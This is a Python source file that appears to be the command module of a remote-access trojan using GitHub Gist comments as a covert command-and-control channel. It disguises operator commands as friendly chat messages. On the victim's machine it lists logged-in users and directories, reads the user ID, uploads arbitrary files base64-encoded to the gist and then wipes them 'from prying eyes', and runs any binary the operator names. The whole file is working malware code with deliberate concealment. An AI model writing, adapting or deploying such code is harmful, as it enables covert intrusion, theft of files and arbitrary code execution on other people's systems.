import base64
import subprocess
from datetime import datetime
import time

from github import InputFileContent

from Util import *


class Command:
    REQUEST = None

    def info(self) -> string:
        raise NotImplementedError

    def send(self, gist: Gist, target: string) -> None:
        raise NotImplementedError

    def receive(self, gist: Gist, name: string, comment: string) -> string:
        raise NotImplementedError

    def get_request_command(self) -> string:
        return self.REQUEST

    @staticmethod
    def run_shell(command) -> subprocess.CompletedProcess:
        result = subprocess.run(command, stdout=subprocess.PIPE)
        return result

    @staticmethod
    def run_shell_async(command) -> None:
        subprocess.Popen(command)

    @staticmethod
    def run_command_and_wait(gist: Gist, command: string) -> string:
        request = gist.create_comment(command)
        for i in range(0, 100):
            response = get_last_comment(gist)
            if response.id == request.id:
                time.sleep(0.1)
            else:
                break
        if response is None:
            raise TimeoutError
        return response.body


class ListUsersCommand(Command):
    REQUEST = " which clients does this concern ?"
    COMMAND = "w -h -s".split(" ")
    RESPONSE = "AFAIK these : "

    def info(self) -> string:
        return "List currently logged in users"

    def send(self, gist: Gist, target: string) -> None:
        response = self.run_command_and_wait(gist, f"{target}{self.REQUEST}")
        users = response[len(self.RESPONSE):]
        print(f"Currently logged in users are : \n {users}")

    def receive(self, gist: Gist, name: string, comment: string) -> string:
        print("Getting active users")

        result = self.run_shell(self.COMMAND)
        users = list(map(lambda line: line.split(" ")[0], result.stdout.decode().split("\n")[:-1]))
        response = gist.create_comment(self.RESPONSE + ",".join(users))
        return response.id


class ListPath(Command):
    REQUEST = " what files do you have in "
    COMMAND = "ls -a".split(" ")
    RESPONSE = "Gee, I found these : "

    def info(self) -> string:
        return "List path"

    def send(self, gist: Gist, target: string) -> None:
        path = input("Input path to list: ").split(" ")[0].strip()
        response = self.run_command_and_wait(gist, f"{target}{self.REQUEST}{path}")
        files = response[len(self.RESPONSE):]
        print(f"Files in given path :  = {files}")

    def receive(self, gist: Gist, name: string, comment: string) -> string:
        print("Listing path")
        path = comment[len(name) + len(self.REQUEST):]
        print(f" the path is '{path}'")
        result = self.run_shell(self.COMMAND + [path])
        files = result.stdout.decode().replace("\n", ",").replace(".,..,", "")
        response = gist.create_comment(self.RESPONSE + files)
        return response.id


class UserId(Command):
    REQUEST = " how much free space do you have on disk ? in GB "
    COMMAND = "id -u".split(" ")
    RESPONSE = "megabites  ? about "

    def info(self) -> string:
        return "Id of current user"

    def send(self, gist: Gist, target: string) -> None:
        response = self.run_command_and_wait(gist, f"{target}{self.REQUEST}")
        id = response[len(self.RESPONSE):]
        print(f"ID of current user is  : \n {id}")

    def receive(self, gist: Gist, name: string, comment: string) -> string:
        print("Getting user ID ")

        result = self.run_shell(self.COMMAND)
        user_id = result.stdout.decode()
        response = gist.create_comment(self.RESPONSE + user_id)
        return response.id


class FileDownload(Command):
    REQUEST = " Can you send me the log file ? it's at "
    RESPONSE = "it is uploaded in gist, hopefully it is the right one ! "
    DELETE_RESPONSE = "I see it, thanks ! I hid it from prying eyes though"
    FAIL_RESP = "I could not find this file, sorry "

    def info(self) -> string:
        return "Get file"

    def send(self, gist: Gist, target: string) -> None:
        path = input("Path to file : ").split(" ")[0].strip()
        response = self.run_command_and_wait(gist, f"{target}{self.REQUEST}{path}")

        if self.FAIL_RESP in response:
            print("Unfortunately the upload failed")
            return

        name = f"downloaded-{datetime.now()}"
        gist.update()
        with open(name, "wb") as f:
            f.write(base64.b64decode(gist.files[get_filename_from_path(path)].content.encode("ascii")))

        gist.edit(files={get_filename_from_path(path): InputFileContent("")})  # DELETE
        gist.create_comment(self.DELETE_RESPONSE)
        print(f"File was downloaded with name {name}")

    def receive(self, gist: Gist, name: string, comment: string) -> string:
        print("Upload file ")
        path = comment[len(name) + len(self.REQUEST):]
        print(f"path is {path}")
        with opened_w_error(path, "rb") as (file, err):
            if err:
                print(f"failing {err}")
                return gist.create_comment(self.FAIL_RESP).id
            else:
                content = file.read()

        files = {get_filename_from_path(path): InputFileContent(base64.b64encode(content).decode("ascii"))}
        gist.edit(files=files)
        return gist.create_comment(self.RESPONSE).id


class ExecuteCommand(Command):
    REQUEST = " Can you run one command for me ? And see, if anything changes ? The command is : "
    RESPONSE = "How do I run it ?"

    def info(self) -> string:
        return "Execute binary"

    def send(self, gist: Gist, target: string) -> None:
        path = input("Path to binary : ").strip()
        self.run_command_and_wait(gist, f"{target}{self.REQUEST}{path}")

        print(f"Command was executed.")

    def receive(self, gist: Gist, name: string, comment: string) -> string:
        print("Run binary")
        path = comment[len(name) + len(self.REQUEST):]
        print(f"bin is {path}")

        self.run_shell_async(path.split(" "))

        response = gist.create_comment(self.RESPONSE)
        return response.id


commands = [ListUsersCommand(), ListPath(), UserId(), FileDownload(), ExecuteCommand()]
